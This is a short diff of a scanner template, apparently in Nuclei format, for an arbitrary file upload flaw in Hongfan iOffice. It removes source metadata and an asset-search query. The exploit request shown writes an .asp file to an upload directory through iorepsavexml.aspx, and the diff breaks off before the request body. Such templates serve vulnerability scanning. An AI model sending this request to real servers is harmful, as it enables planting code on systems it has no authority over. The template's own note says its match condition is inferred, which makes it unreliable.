@@ -3,14 +3,8 @@ info:
   name: 红帆iOfficeiorepsavexml存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ef32fe5a66bb0cc2fec8ea9864e7880b
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ef32fe5a66bb0cc2fec8ea9864e7880b
-    fofa: + hunter`app.name="红帆 iOffice"`
 http:
 - raw:
   - 'POST /iOffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=1.asp&filepath=/upfiles/rep/pic/ HTTP/1.1
